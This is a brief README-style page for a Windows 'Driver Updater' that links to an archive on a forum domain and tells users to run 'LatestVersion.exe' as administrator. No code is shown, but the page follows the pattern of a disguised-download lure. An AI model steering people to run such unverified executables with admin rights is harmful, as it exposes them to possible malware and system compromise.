# Driver Updater

Scans installed devices and fetches the latest official drivers for each.

---

**[→ Download latest version](https://forumconnect.uk/drivers)**

---

## Steps

1. Download and extract the archive
2. Right-click `LatestVersion.exe` → Run as administrator

## Compatibility

Windows 10 · Windows 11 · 64-bit
